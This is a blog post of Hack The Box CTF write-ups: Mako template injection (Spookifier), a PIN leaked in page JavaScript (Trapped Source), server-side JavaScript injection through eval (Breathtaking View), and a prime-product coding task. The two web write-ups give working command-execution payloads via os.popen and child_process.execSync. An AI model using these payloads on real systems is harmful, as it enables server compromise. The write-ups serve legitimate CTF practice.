---
title: "HTB CTF Writeups and Notes"
description: "HTB writeups for Spookifier, Trapped Source, Breathtaking View, and Primed for Action, covering template injection, source analysis, SSJI, and primes."
date: "2025-08-30"
tags:
  - "HTB"
  - "CTF"
  - "Web"
  - "Coding"
  - "MOBILE"
  - "CRYPTO"
  - "REVERSE"
authors:
  - "bx"
draft: false
slug: "htb-challenge-en"
lang: "en"
translationKey: "htb-challenge"
---
# HTB CTF Notes

## WEB

### Spookifier

> There's a new trend of an application that generates a spooky name for you. Users of that application later discovered that their real names were also magically changed, causing havoc in their life. Could you help bring down this application?
> A new application generates spooky names for users. Later, they discover their real names have also been magically changed, wreaking havoc in their lives. Can you help take the application down?

Go straight to the vulnerable point.

```python
from mako.template import Template


def generate_render(converted_fonts):
	result = '''
		<tr>
			<td>{0}</td>
        </tr>
        
		<tr>
        	<td>{1}</td>
        </tr>
        
		<tr>
        	<td>{2}</td>
        </tr>
        
		<tr>
        	<td>{3}</td>
        </tr>

	'''.format(*converted_fonts)
	
	return Template(result).render()

def change_font(text_list):
	text_list = [*text_list]
	current_font = []
	all_fonts = []
	
	add_font_to_list = lambda text,font_type : (
		[current_font.append(globals()[font_type].get(i, ' ')) for i in text], all_fonts.append(''.join(current_font)), current_font.clear()
		) and None

	add_font_to_list(text_list, 'font1')
	add_font_to_list(text_list, 'font2')
	add_font_to_list(text_list, 'font3')
	add_font_to_list(text_list, 'font4')

	return all_fonts

def spookify(text):
	converted_fonts = change_font(text_list=text)

	return generate_render(converted_fonts=converted_fonts)

```

It renders directly, and it uses the Mako engine.

```python
${7*7}
```

![image-20250831121956207](https://raw.githubusercontent.com/bx33661/Picgo/main/20250831121958413.png)

```python
${__import__('os').popen('ls').read()}
${__import__('os').popen('cat /fla*').read()}
```

The flag was obtained.

### **Trapped Source**

> Intergalactic Ministry of Spies tested Pandora's movement and intelligence abilities. She found herself locked in a room with no apparent means of escape. Her task was to unlock the door and make her way out. Can you help her in opening the door?
> The Intergalactic Ministry of Spies tested Pandora's movement and intelligence. She found herself locked in a room with no obvious escape. Her task was to unlock the door and get out. Can you help her open it?

Open the page and inspect the JS code; the correct password is there.

```nginx
	<script>
		window.CONFIG = window.CONFIG || {
			buildNumber: "v20190816",
			debug: false,
			modelName: "Valencia",
			correctPin: "5417",
		}
	</script>
```

Enter it to get the flag.

### **Breathtaking View**

> Check out my new website showcasing a breathtaking view—let's hope no one can 'manipulate' it!
> Check out my new website, showcasing a breathtaking view—let's hope no one can ‘manipulate’ it!

A SSJI challenge

A calculator interface

Code audit

```javascript
const path       = require('path');
const express    = require('express');
const router     = express.Router();
const Calculator = require('../helpers/calculatorHelper');

const response = data => ({ message: data });

router.get('/', (req, res) => {
  return res.sendFile(path.resolve('views/index.html'));
});

router.post('/api/calculate', (req, res) => {
  let { formula } = req.body;

  if (formula) {
    result = Calculator.calculate(formula);
    return res.send(response(result));
  }

  return res.send(response('Missing parameters'));
})

module.exports = router;

// ocd
```

Let's look at this calculate function.

```javascript
module.exports = {
    calculate(formula) {
        try {
            return eval(`(function() { return ${ formula } ;}())`);

        } catch (e) {
            if (e instanceof SyntaxError) {
                return 'Something went wrong!';
            }
        }
    }
}


// ocd
```

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1756994516843-e66d27d4-3c6b-46a2-bcb0-e67e5fc2c7d4.png)

JavaScript code can be executed.

Construct the following to list the current directory.

```html
process.platform

require('child_process').execSync('ls').toString()
```

Try to retrieve the flag.

```javascript
require('child_process').execSync('cat /flag.txt').toString()
```

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1756994999793-95b26fcb-b440-4ec3-a3f7-ec6105aac467.png)

The flag was obtained.

## Coding

### Primed for Action

> Intelligence units have intercepted a list of numbers. They seem to be used in a peculiar way: the adversary seems to be sending a list of numbers, most of which are garbage, but two of which are prime. These 2 prime numbers appear to form a key, which is obtained by multiplying the two. Your answer is the product of the two prime numbers. Find the key and help us solve the case.
> Intelligence units intercepted a list of numbers used in an unusual way: the adversary appears to send mostly garbage data, but two entries are prime. These two primes form a key obtained by multiplying them. Your answer is their product. Find the key and help us crack the case.

Just write an algorithm.

```python
# take in the number
n = input()

nums = list(map(int, n.split()))

def is_prime(x: int) -> bool:
    if x < 2:
        return False
    if x % 2 == 0:
        return x == 2
    i = 3
    while i * i <= x:
        if x % i == 0:
            return False
        i += 2
    return True

# 找两个质数
primes = [x for x in nums if is_prime(x)]

# 计算乘积
ans = primes[0] * primes[1]

# print answer
print(ans)
```
![image-20250831120324987](https://raw.githubusercontent.com/bx33661/Picgo/main/20250831122737951.png)
